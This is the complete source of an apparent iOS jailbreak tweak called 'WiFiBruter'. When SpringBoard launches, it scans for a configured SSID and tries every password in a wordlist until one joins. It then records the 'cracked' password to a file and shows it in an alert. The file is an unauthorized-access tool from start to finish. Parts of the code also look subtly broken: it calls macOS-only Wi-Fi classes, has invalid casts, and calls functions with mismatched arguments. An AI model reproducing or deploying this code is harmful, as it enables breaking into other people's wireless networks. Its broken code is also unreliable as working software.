#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>

static NSString *const kPrefsDomain = @"com.kilo.wifibruter";
static NSString *const kLogPath = @"/var/mobile/Documents/wifibruter_log.txt";
static NSTimeInterval kMinDelay = 0.5;

@interface CWInterface (Private)
- (NSArray *)scanForNetworksWithName:(NSString *)ssid error:(NSError **)error;
- (NSArray *)scanForNetworksWithSSID:(NSString *)ssid error:(NSError **)error;
- (BOOL)joinNetwork:(id)network withPassword:(NSString *)password error:(NSError **)error;
- (BOOL)associateToNetwork:(id)network password:(NSString *)password error:(NSError **)error;
@end

static void logMessage(NSString *msg) {
    NSData *data = [msg dataUsingEncoding:NSUTF8StringEncoding];
    FILE *f = fopen([kLogPath fileSystemRepresentation], "a");
    if (f) {
        fwrite([data bytes], 1, [data length], f);
        fputc('\n', f);
        fclose(f);
    }
}

static NSString *iosVersionString(void) {
    return [[UIDevice currentDevice] systemVersion];
}

static BOOL isIOS15OrLater(void) {
    NSString *ver = iosVersionString();
    NSArray *parts = [ver componentsSeparatedByString:@"."];
    NSInteger major = [[parts firstObject] integerValue];
    return major >= 15;
}

static NSDictionary *loadConfig(id self) {
    CFStringRef keys[] = { CFSTR("Enabled"), CFSTR("TargetSSID"), CFSTR("WordListPath"), CFSTR("DelayBetweenAttempts") };
    CFDictionaryRef prefs = CFPreferencesCopyAppPreferences(CFSTR(kPrefsDomain), kCFPreferencesCurrentUser, kCFPreferencesAnyHost);
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    if (prefs) {
        for (NSString *key in (NSArray *)keys) {
            id val = [(NSDictionary *)prefs objectForKey:key];
            if (val) dict[key] = val;
        }
        CFRelease(prefs);
    }
    return [dict copy];
}

static NSArray *loadPasswords(id self) {
    NSDictionary *config = loadConfig(self);
    NSString *path = [config objectForKey:@"WordListPath"];
    if (!path || path.length == 0) path = @"/var/mobile/Documents/wordlist.txt";
    NSString *wordlist = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
    if (!wordlist) {
        logMessage([NSString stringWithFormat:@"WiFiBruter: failed to read wordlist at %@", path]);
        return @[];
    }
    NSArray *parts = [wordlist componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
    NSMutableArray *passwords = [NSMutableArray array];
    for (NSString *p in parts) {
        if (p.length > 0) [passwords addObject:p];
    }
    logMessage([NSString stringWithFormat:@"WiFiBruter: loaded %lu passwords", (unsigned long)passwords.count]);
    return [passwords copy];
}

static BOOL isEnabled(id self) {
    NSDictionary *config = loadConfig(self);
    NSNumber *enabled = [config objectForKey:@"Enabled"];
    return [enabled boolValue];
}

static NSString *targetSSID(id self) {
    NSDictionary *config = loadConfig(self);
    return [config objectForKey:@"TargetSSID"] ?: @"";
}

static NSTimeInterval getDelay(id self) {
    NSDictionary *config = loadConfig(self);
    NSNumber *d = [config objectForKey:@"DelayBetweenAttempts"];
    NSTimeInterval delay = [d doubleValue];
    if (delay < kMinDelay) delay = kMinDelay;
    return delay;
}

static BOOL joinWithNetwork(id self, id network, NSString *password, NSError **outError) {
    Class cwCls = NSClassFromString(@"CWInterface");
    if (!cwCls) return NO;
    id iface = [cwCls performSelector:@selector(sharedInterface)];
    if (!iface) return NO;
    BOOL ok = NO;
    SEL selectors[] = {
        @selector(joinNetwork:withPassword:error:),
        @selector(associateToNetwork:password:error:),
        @selector(associateToNetwork:password:withSSID:error:)
    };
    NSUInteger count = sizeof(selectors) / sizeof(selectors[0]);
    for (NSUInteger i = 0; i < count; i++) {
        SEL sel = selectors[i];
        if ([iface respondsToSelector:sel]) {
            NSMethodSignature *sig = [iface methodSignatureForSelector:sel];
            if (!sig) continue;
            NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
            [inv setTarget:iface];
            [inv setSelector:sel];
            [inv setArgument:&network atIndex:2];
            [inv setArgument:&password atIndex:3];
            [inv setArgument:&outError atIndex:4];
            [inv invoke];
            [inv getReturnValue:&ok];
            if (ok) break;
        }
    }
    return ok;
}

static NSArray *scanForTarget(id self, NSString *ssid, NSError **outError) {
    Class cwCls = NSClassFromString(@"CWInterface");
    if (!cwCls) return nil;
    id iface = [cwCls performSelector:@selector(sharedInterface)];
    if (!iface) return nil;
    NSArray *result = nil;
    SEL selectors[] = {
        @selector(scanForNetworksWithName:error:),
        @selector(scanForNetworksWithSSID:error:)
    };
    NSUInteger count = sizeof(selectors) / sizeof(selectors[0]);
    for (NSUInteger i = 0; i < count; i++) {
        SEL sel = selectors[i];
        if ([iface respondsToSelector:sel]) {
            NSMethodSignature *sig = [iface methodSignatureForSelector:sel];
            if (!sig) continue;
            NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
            [inv setTarget:iface];
            [inv setSelector:sel];
            [inv setArgument:&ssid atIndex:2];
            [inv setArgument:&outError atIndex:3];
            [inv invoke];
            [inv getReturnValue:&result];
            if (result) break;
        }
    }
    if (!result || result.count == 0) {
        if ([iface respondsToSelector:@selector(scanForNetworksWithError:)]) {
            NSError *scanErr = nil;
            NSMethodSignature *sig = [iface methodSignatureForSelector:@selector(scanForNetworksWithError:)];
            if (sig) {
                NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
                [inv setTarget:iface];
                [inv setSelector:@selector(scanForNetworksWithError:)];
                [inv setArgument:&scanErr atIndex:2];
                [inv invoke];
                [inv getReturnValue:&result];
            }
            if (result) {
                NSPredicate *pred = [NSPredicate predicateWithFormat:@"ssid == %@", ssid];
                result = [result filteredArrayUsingPredicate:pred];
            }
        }
    }
    return result;
}

static void runBruteForce(id self) {
    if (!isEnabled(self)) return;
    NSString *target = targetSSID(self);
    if (target.length == 0) return;
    NSArray *passwords = loadPasswords(self);
    if (passwords.count == 0) return;
    NSTimeInterval delay = getDelay(self);

    Class cwCls = NSClassFromString(@"CWInterface");
    if (!cwCls) {
        logMessage(@"WiFiBruter: CWInterface class not available (likely iOS 15+ sandbox restriction)");
        return;
    }

    NSError *scanError = nil;
    NSArray *networks = scanForTarget(self, target, &scanError);
    if (!networks || networks.count == 0) {
        logMessage([NSString stringWithFormat:@"WiFiBruter: no networks found for SSID %@", target]);
        return;
    }
    logMessage([NSString stringWithFormat:@"WiFiBruter: found %lu network(s) for %@", (unsigned long)networks.count, target]);

    for (id network in networks) {
        for (NSString *password in passwords) {
            NSError *joinError = nil;
            BOOL ok = joinWithNetwork(self, network, password, &joinError);
            if (ok) {
                reportSuccess(self, target, password);
                return;
            }
            if (joinError) {
                logMessage([NSString stringWithFormat:@"WiFiBruter: join failed for '%@': %@", password, joinError.localizedDescription]);
            }
            if (delay > 0) usleep((useconds_t)(delay * 1000000.0));
        }
    }
    logMessage(@"WiFiBruter: exhausted wordlist without success");
}

static void reportSuccess(id self, NSString *ssid, NSString *password) {
    NSString *message = [NSString stringWithFormat:@"WiFiBruter: cracked %@ -> %@", ssid, password];
    NSString *logPath = @"/var/mobile/Documents/wifibruter_result.txt";
    [message writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    logMessage(message);
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"WiFiBruter" message:message delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil];
        [alert show];
    });
}

%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)application {
    %orig;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        runBruteForce(self);
    });
}
%end
